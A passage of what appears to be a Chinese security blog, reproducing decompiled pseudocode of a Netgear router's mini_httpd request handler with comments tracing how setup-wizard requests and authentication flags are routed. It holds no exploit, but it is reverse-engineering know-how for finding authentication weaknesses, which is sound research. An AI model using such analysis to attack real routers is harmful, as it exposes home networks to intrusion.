class="string">&quot;\r\n\r\n&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v11, <span class="string">&quot;\n\n&quot;</span>) );</span><br><span class="line">  v12 = access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v7 = <span class="number">4259840</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v8, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1649</span>);</span><br><span class="line">      v9 = <span class="string">&quot;break on find 2 crlf\n&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  v13 = sub_405720(v7);</span><br><span class="line">  v14 = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">  v15 = <span class="built_in">strpbrk</span>(v13, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">  path = v15;</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  path = (v15 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v15 + <span class="number">1</span>, <span class="string">&quot;ptimeout.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !multi_login_flag )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = getppid();</span><br><span class="line">      kill(v17, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = path;</span><br><span class="line">    path = v18 + <span class="built_in">strspn</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    v19 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">    dword_429740 = v19;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v19 = <span class="number">0</span>;</span><br><span class="line">      dword_429740 = (v19 + <span class="number">1</span>);</span><br><span class="line">      v20 = <span class="number">401</span>;</span><br><span class="line">      v21 = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line">      v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">      v23 = <span class="string">&quot;Authorization required.&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_45:</span><br><span class="line">    v20 = <span class="number">400</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">    v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">LABEL_266:</span><br><span class="line">    v23 = <span class="string">&quot;Can&#x27;t parse request.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = sub_405720(v16);</span><br><span class="line">    <span class="keyword">if</span> ( !v37 || !*v37 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Authorization:&quot;</span>, <span class="number">0xE</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      authorization = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">14</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">14</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Content-Length:&quot;</span>, <span class="number">0xF</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = v37 + <span class="number">15</span>;</span><br><span class="line">      v25 = <span class="built_in">strspn</span>(v24, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_429758 = atol(&amp;v24[v25]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Content-Type:&quot;</span>, <span class="number">0xD</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_429754 = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">13</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42975C = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">7</span>];</span><br><span class="line">      dword_429784 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Host:&quot;</span>, <span class="number">5u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v26 = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">5</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">5</span>];</span><br><span class="line">      host = v26;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>(v26, <span class="number">47</span>) || *v26 == <span class="number">46</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;If-Modified-Since:&quot;</span>, <span class="number">0x12</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v27 = v37 + <span class="number">18</span>;</span><br><span class="line">      v28 = <span class="built_in">strspn</span>(v27, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">      dword_429760 = tdate_parse(&amp;v27[v28]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Referer:&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ::haystack = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">8</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;Referrer:&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ::haystack = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">9</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">9</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(v37, <span class="string">&quot;User-Agent:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_429768 = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">11</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">11</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = strncasecmp(v37, <span class="string">&quot;Accept-Language:&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">      v30 = v37;</span><br><span class="line">      <span class="keyword">if</span> ( v29 )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = v37 + <span class="number">11</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !strncasecmp(v30, <span class="string">&quot;SOAPAction:&quot;</span>, <span class="number">0xB</span>u) )</span><br><span class="line">        &#123;</span><br><span class="line">          v32 = <span class="built_in">strspn</span>(v31, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">          v33 = strcasestr(&amp;v31[v32], <span class="string">&quot;urn:NETGEAR-ROUTER:service:&quot;</span>);</span><br><span class="line">          v16 = (v33 + <span class="number">27</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              v35 = *v16;</span><br><span class="line">              <span class="keyword">if</span> ( v35 == <span class="number">58</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              *(i + <span class="number">4364168</span>) = v35;</span><br><span class="line">              ++v16;</span><br><span class="line">            &#125;</span><br><span class="line">            v36 = <span class="built_in">strchr</span>(v16, <span class="number">35</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v36 &amp;&amp; v36[<span class="number">1</span>] )</span><br><span class="line">              <span class="built_in">snprintf</span>(&amp;byte_429808, <span class="number">0x80</span>u, <span class="string">&quot;%s&quot;</span>, v36 + <span class="number">1</span>);</span><br><span class="line">            byte_429788[i] = <span class="number">0</span>;</span><br><span class="line">            currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        dword_42976C = &amp;v37[<span class="built_in">strspn</span>(v37 + <span class="number">16</span>, <span class="string">&quot; \t&quot;</span>) + <span class="number">16</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( host )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v38 )</span><br><span class="line">      v38 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v38 == <span class="number">98</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_407;</span><br><span class="line">    v39 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v39 )</span><br><span class="line">      v39 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v39 == <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_407:</span><br><span class="line">      <span class="keyword">if</span> ( is_captive_detecting(host, dword_429768) )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_42988C = <span class="number">1</span>;</span><br><span class="line">        dword_429740 = <span class="built_in">strpbrk</span>(path, <span class="string">&quot; \t\n\r&quot;</span>);</span><br><span class="line">        v20 = <span class="number">200</span>;</span><br><span class="line">        v21 = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">        v23 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !host &amp;&amp; currentsetting_flag == <span class="number">1</span> )</span><br><span class="line">    host = <span class="string">&quot;www.routerlogin.com&quot;</span>;</span><br><span class="line">  is_usb_session = usb_session_check();</span><br><span class="line">  v40 = <span class="number">1</span>;</span><br><span class="line">  LODWORD(v182) = &amp;host;</span><br><span class="line">  HIDWORD(v182) = host;</span><br><span class="line">  v41 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(HIDWORD(v182), v41) )</span><br><span class="line">    v40 = <span class="built_in">strstr</span>(*v182, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>;</span><br><span class="line">  LODWORD(v182) = <span class="number">4259840</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">49</span> &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v42 )</span><br><span class="line">      v42 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v42 == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v40 || (LODWORD(v182) = host, v43 = getIPAddress(<span class="string">&quot;group1&quot;</span>), !<span class="built_in">strcmp</span>(v182, v43)) )</span><br><span class="line">        v40 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !(v40 | is_usb_session) )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">      v40 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">48</span> &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">49</span> &amp;&amp; *nvram_get(<span class="string">&quot;config_state&quot;</span>) == <span class="number">115</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = is_usb_session;</span><br><span class="line">    <span class="keyword">if</span> ( is_usb_session &amp;&amp; !v40 )</span><br><span class="line">    &#123;</span><br><span class="line">      system(<span class="string">&quot;/bin/echo drop request usb &gt; /dev/console&quot;</span>);</span><br><span class="line">LABEL_97:</span><br><span class="line">      v45 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v44 = is_usb_session;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v44 )</span><br><span class="line">    multi_login_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !check_valid_request() )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">403</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">    v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    v23 = <span class="string">&quot;URL is illegal.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;setupwizard.cgi&quot;</span>) )</span><br><span class="line">    currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( currentsetting_flag == <span class="number">1</span> &amp;&amp; !check_lan_guest() )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie from wan, drop request now &gt; /dev/console&quot;</span>);</span><br><span class="line">    v45 = <span class="number">0</span>;</span><br><span class="line">LABEL_98:</span><br><span class="line">    <span class="built_in">exit</span>(v45);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( currentsetting_flag == <span class="number">1</span> )               <span class="comment">// 是安装向导就进入 if</span></span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo it is for setupwizard! &gt;&gt; /tmp/sw.log&quot;</span>);</span><br><span class="line">    LODWORD(v182) = <span class="number">0x430000</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(temp_uri, <span class="string">&quot;/setupwizard.cgi HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">    path = v182 - <span class="number">0x6770</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_429784 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_429A90 = <span class="number">0</span>;</span><br><span class="line">      dword_429A94 = <span class="number">0</span>;</span><br><span class="line">      dword_429A98 = <span class="number">0</span>;</span><br><span class="line">      dword_429A9C = <span class="number">0</span>;</span><br><span class="line">      byte_429AA0 = <span class="number">0</span>;</span><br><span class="line">      v46 = <span class="built_in">strchr</span>(dword_42975C, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v46 )</span><br><span class="line">        strlcpy(&amp;dword_429A90, v46 + <span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dnshj.out&quot;</span>, <span class="number">0</span>) &amp;&amp; (!<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) || !<span class="built_in">strncmp</span>(path, <span class="string">&quot;/ &quot;</span>, <span class="number">2u</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v47 = dword_428518;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_428518 )</span><br><span class="line">        v47 = <span class="string">&quot;indexdnshj.htm&quot;</span>;</span><br><span class="line">      <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/ca/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v47);</span><br><span class="line">      path = temp_uri;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v48 = select_request_type(<span class="number">1</span>);             <span class="comment">// 除了安装向导和 setup 的请求走这里</span></span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v14, v48) )              <span class="comment">// 判断是不是 GET 请求？</span></span><br><span class="line">      &#123;</span><br><span class="line">        v49 = path;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v49, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) )<span class="comment">// 如果 PATH 里面有 .htm 或者直接访问的根目录，就进入 if</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v182) = host;</span><br><span class="line">          v50 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">          v51 = <span class="built_in">strcmp</span>(v182, v50);</span><br><span class="line">          haystack = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v51 )</span><br><span class="line">            haystack = (<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>);<span class="comment">// 不能存在 routerlogin</span></span><br><span class="line">          nvram_get(<span class="string">&quot;tm_action_internet&quot;</span>);</span><br><span class="line">          v52 = path;</span><br><span class="line">          stream = <span class="built_in">strstr</span>(path, <span class="string">&quot;traffic_status.htm&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !haystack || (v53 = <span class="built_in">strstr</span>(v52, <span class="string">&quot;_h.htm&quot;</span>) != <span class="number">0</span>, access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>)) &amp;&amp; !v53 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(temp_uri, <span class="string">&quot;/ HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !stream )                      <span class="comment">// URI 也没有 traffic_status.htm</span></span><br><span class="line">            &#123;</span><br><span class="line">              v54 = fopen64(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">// 是否存在这个文件？</span></span><br><span class="line">              stream = v54;</span><br><span class="line">              <span class="keyword">if</span> ( v54 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( fgets(v177, <span class="number">99</span>, v54) &amp;&amp; (v55 = <span class="built_in">strstr</span>(v177, <span class="string">&quot;htm&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v55[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                  <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v177);</span><br><span class="line">                  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_block_internet&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    LODWORD(v182) = <span class="number">4259840</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v56 = fopen64(v182 + <span class="number">14864</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v56 )</span><br><span class="line">                        fclose(v56);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  path = temp_uri;</span><br><span class="line">                  login_or_not = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v177, <span class="string">&quot;lan_wan_conflict&quot;</span>) &amp;&amp; !haystack )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">sprintf</span>(temp_uri, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, <span class="string">&quot;alert.htm&quot;</span>);</span><br><span class="line">                  path = temp_uri;</span><br><span class="line">                &#125;</span><br><span class="line">                fclose(stream);</span><br><span class="line">                multi_login_flag = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>, <span class="number">0</span>) ) <span class="comment">// 前提是存在这个文件</span></span><br><span class="line">  &#123;</span><br><span class="line">    v57 = dword_429768;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(dword_429768, <span class="string">&quot;Genie&quot;</span>) || <span class="built_in">strstr</span>(v57, <span class="string">&quot;LANWizard&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_162;</span><br><span class="line">    v58 = select_request_type(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v14, v58) )                <span class="comment">// 如果是 GET 请求就进入 if</span></span><br><span class="line">    &#123;</span><br><span class="line">      v59 = path;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;error-tab-rec.htm&quot;</span>)</span><br><span class="line">        &amp;&amp; (<span class="built_in">strstr</span>(v59, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v59, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) || <span class="built_in">strstr</span>(v59, <span class="string">&quot;.aspx&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          strlcpy(temp_uri, <span class="string">&quot;/setup.cgi?next_file=BRS_wanlan_conflict.html HTTP/1.1\r\n&quot;</span>, <span class="number">512</span>);</span><br><span class="line">          path = temp_uri;</span><br><span class="line">          system(<span class="string">&quot;/bin/cp /proc/uptime /tmp/conflict_warning&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    login_or_not = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;settings.jpg&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/touch /tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v182 = get_uptime(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">    v60 = get_uptime(<span class="string">&quot;/proc/uptime&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( HIDWORD(v60) - HIDWORD(v182) != v60 &lt; v182 || (v60 - v182) &gt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>);</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_162:</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_hijack.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">  v61 = getIPAddress(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">  v62 = host;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(host, <span class="string">&quot;www.msftncsi.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;ncsi.txt&quot;</span>)</span><br><span class="line">    || !<span class="built_in">strcmp</span>(v62, <span class="string">&quot;www.msftconnecttest.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;connecttest.txt&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_429740 = <span class="string">&quot;HTTP/1.0&quot;</span>;</span><br><span class="line">    v20 = <span class="number">404</span>;</span><br><span class="line">    v21 = <span class="string">&quot;Not Found&quot;</span>;</span><br><span class="line">    v22 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">LABEL_372:</span><br><span class="line">    v23 = <span class="string">&quot;File not found.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_382;</span><br><span class="line">  &#125;</span><br><span class="line">  v63 = socket(<span class="number">2</span>, <span class="number">3</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v63 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> (perror)(<span class="string">&quot;socket creating failed&quot;</span>);</span><br><span class="line">  v65 = nvram_get(<span class="string">&quot;wan_ifname&quot;</span>);</span><br><span class="line">  strlcpy(v172, v65, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ioctl(v63, <span class="number">0x8915</span>u, v172) )</span><br><span class="line">  &#123;</span><br><span class="line">    v74 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v74 )</span><br><span class="line">      v74 = (<span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>);</span><br><span class="line">    v75 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v74 )</span><br><span class="line">    &#123;</span><br><span class="line">      v75 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(host, v61) )</span><br><span class="line">      &#123;</span><br><span class="line">        v76 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v76 )</span><br><span class="line">          v76 = <span class="string">&quot;\r\n\r\n&quot;</span> + <span class="number">4</span>;</span><br><span class="line">        v75 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( atoi(v76) )</span><br><span class="line">        &#123;</span><br><span class="line">          v77 = host;</span><br><span class="line">          v78 = nvram_get(<span class="string">&quot;wifi_ap_name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v78 )</span><br><span class="line">            v78 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          v75 = strcasestr(v77, v78) != <span 